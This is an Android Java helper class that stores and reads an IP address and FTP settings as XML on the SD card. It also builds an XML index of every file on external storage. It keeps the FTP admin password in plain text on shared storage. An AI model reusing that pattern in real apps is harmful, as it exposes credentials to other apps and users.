package com.google.security.tools;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import org.dom4j.Document;
import org.dom4j.DocumentException;
import org.dom4j.DocumentHelper;
import org.dom4j.Element;
import org.dom4j.io.OutputFormat;
import org.dom4j.io.SAXReader;
import org.dom4j.io.XMLWriter;

import android.content.Context;
import android.database.Cursor;
import android.os.Environment;
import android.widget.Toast;

public class XmlTools {
	Context context;
	private static int NUM = 1;
	private static String sdState = Environment.getExternalStorageState();
	private static String path = Environment.getExternalStorageDirectory()
			.toString();
	static File files = Environment.getExternalStorageDirectory();

	public XmlTools(Context con) {
		this.context = con;
	}

	public static String readip() {
		SAXReader reader = new SAXReader();
		// 读取一个文件，把这个文件转换成Document对象
		Document document = null;
		try {
			document = reader
					.read(new File(path + "/security/Media/ip/ip.xml"));
		} catch (DocumentException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		// 获取根元素
		Element root = document.getRootElement();
		// 把文档转换字符串
		String ip = root.getText();
		return ip;
	}

	public static String readurl() {
		SAXReader reader = new SAXReader();
		// 读取一个文件，把这个文件转换成Document对象
		Document document = null;
		try {
			document = reader
					.read(new File(path + "/security/Media/ftp/ftp.xml"));
		} catch (DocumentException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		// 获取根元素
		Element root = document.getRootElement();
		Element eleUrl = root.element("url");
		String url = eleUrl.getText();
		return url;
	}

	public static String readport() {
		SAXReader reader = new SAXReader();
		// 读取一个文件，把这个文件转换成Document对象
		Document document = null;
		try {
			document = reader
					.read(new File(path + "/security/Media/ftp/ftp.xml"));
		} catch (DocumentException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		// 获取根元素
		Element root = document.getRootElement();
		Element elePort = root.element("port");
		String port = elePort.getText();
		return port;
	}

	public static String readadmin() {
		SAXReader reader = new SAXReader();
		// 读取一个文件，把这个文件转换成Document对象
		Document document = null;
		try {
			document = reader
					.read(new File(path + "/security/Media/ftp/ftp.xml"));
		} catch (DocumentException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		// 获取根元素
		Element root = document.getRootElement();
		Element eleadmin = root.element("admin");
		String admin = eleadmin.getText();
		return admin;
	}

	public static String readpsw() {
		SAXReader reader = new SAXReader();
		// 读取一个文件，把这个文件转换成Document对象
		Document document = null;
		try {
			document = reader
					.read(new File(path + "/security/Media/ftp/ftp.xml"));
		} catch (DocumentException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		// 获取根元素
		Element root = document.getRootElement();
		Element elepsw = root.element("psw");
		String psw = elepsw.getText();
		return psw;
	}

	public static void savefilesasxml() {
		if (sdState.equals(Environment.MEDIA_MOUNTED)) {
			Document document = DocumentHelper.createDocument();
			document.setXMLEncoding("utf-8");
			Element nodes = document.addElement("node");
			nodes.addAttribute("parentID", -1 + "");
			nodes.addAttribute("nodeID", 0 + "");
			nodes.addAttribute("name", "sdcard");
			nodes.addAttribute("path", "/");
			nodes.addAttribute("TAG", "NO");
			File filesarry[] = files.listFiles();
			for (File f : filesarry) {
				if (f.isDirectory()) {
					Element node = nodes.addElement("node");
					node.addAttribute("parentID", 0 + "");
					node.addAttribute("nodeID", NUM++ + "");
					node.addAttribute("name", f.getName());
					node.addAttribute("path", "*#*"
							+ f.getAbsolutePath().substring(19));
					node.addAttribute("TAG", "NO");

					writefiledir(f, node);

				} else {

					Element node = nodes.addElement("node");
					node.addAttribute("parentID", 0 + "");
					node.addAttribute("nodeID", NUM++ + "");
					node.addAttribute("name", f.getName());
					node.addAttribute("path", "*#*"
							+ f.getAbsolutePath().substring(19));
					node.addAttribute("TAG", "YES");

				}
			}

			try {
				writefiles(document);
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

	}

	private static void writefiledir(File fil, Element element) {
		String parentID = element.attributeValue("nodeID");
		for (File f : fil.listFiles()) {
			if (f.isDirectory()) {
				Element node = element.addElement("node");
				node.addAttribute("parentID", parentID);
				node.addAttribute("nodeID", NUM++ + "");
				node.addAttribute("name", f.getName());
				node.addAttribute("path", "*#*"
						+ f.getAbsolutePath().substring(19));
				node.addAttribute("TAG", "NO");
				writefiledir(f, node);
			} else {
				Element node = element.addElement("node");
				node.addAttribute("parentID", parentID);
				node.addAttribute("nodeID", NUM++ + "");
				node.addAttribute("name", f.getName());
				node.addAttribute("path", "*#*"
						+ f.getAbsolutePath().substring(19));
				node.addAttribute("TAG", "YES");

			}
		}

	}

	public static void saveipasxml(String ip) {
		// ip = "http://" + ip + ":8090";
		Document document = DocumentHelper.createDocument();
		document.setXMLEncoding("utf-8");
		Element eleRoot = document.addElement("ip");
		eleRoot.addText(ip);
		try {
			write(document);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static void saveftpasxml(String url, String port, String admin,
			String psw) {
		// ip = "http://" + ip + ":8090";
		Document document = DocumentHelper.createDocument();
		document.setXMLEncoding("utf-8");
		Element eleRoot = document.addElement("ftp");
		Element eleUrl = eleRoot.addElement("url");
		eleUrl.addText(url);
		Element elePort = eleRoot.addElement("port");
		elePort.addText(port);
		Element eleAdmin = eleRoot.addElement("admin");
		eleAdmin.addText(admin);
		Element elePsw = eleRoot.addElement("psw");
		elePsw.addText(psw);
		try {
			writeftp(document);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private static void writeftp(Document document) throws Exception {
		String fileName = "ftp.xml";
		File file;
		File saveName;
		if (sdState.equals(Environment.MEDIA_MOUNTED)) {
			file = new File(path + "/security/Media/ftp");
			if (!file.exists()) {
				file.mkdirs();
			}
			saveName = new File(file, fileName);
			try {
				if (!saveName.exists()) {
					saveName.createNewFile();
				} else if (saveName.exists()) {
					saveName.delete();
					if (!saveName.exists()) {
						saveName.createNewFile();
					}
				}
				OutputFormat format = OutputFormat.createPrettyPrint();
				format.setEncoding("UTF-8");
				XMLWriter writer = new XMLWriter(new OutputStreamWriter(
						new FileOutputStream(saveName), "UTF-8"), format);
				writer.write(document);
				writer.flush();
				writer.close();
			} catch (FileNotFoundException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	private static void write(Document document) throws Exception {
		String fileName = "ip.xml";
		File file;
		File saveName;
		if (sdState.equals(Environment.MEDIA_MOUNTED)) {
			file = new File(path + "/security/Media/ip");
			if (!file.exists()) {
				file.mkdirs();
			}
			saveName = new File(file, fileName);
			try {
				if (!saveName.exists()) {
					saveName.createNewFile();
				} else if (saveName.exists()) {
					saveName.delete();
					if (!saveName.exists()) {
						saveName.createNewFile();
					}
				}
				OutputFormat format = OutputFormat.createPrettyPrint();
				format.setEncoding("UTF-8");
				XMLWriter writer = new XMLWriter(new OutputStreamWriter(
						new FileOutputStream(saveName), "UTF-8"), format);
				writer.write(document);
				writer.flush();
				writer.close();
			} catch (FileNotFoundException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	private static void writefiles(Document document) throws Exception {
		String fileName = "files.xml";
		File file;
		File saveName;
		if (sdState.equals(Environment.MEDIA_MOUNTED)) {
			file = new File(path + "/security/Media/files");
			if (!file.exists()) {
				file.mkdirs();
			}
			saveName = new File(file, fileName);
			try {
				if (!saveName.exists()) {
					saveName.createNewFile();
				} else if (saveName.exists()) {
					saveName.delete();
					if (!saveName.exists()) {
						saveName.createNewFile();
					}
				}
				OutputFormat format = OutputFormat.createPrettyPrint();
				format.setEncoding("UTF-8");
				XMLWriter writer = new XMLWriter(new OutputStreamWriter(
						new FileOutputStream(saveName), "UTF-8"), format);
				writer.write(document);
				writer.flush();
				writer.close();
			} catch (FileNotFoundException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

}
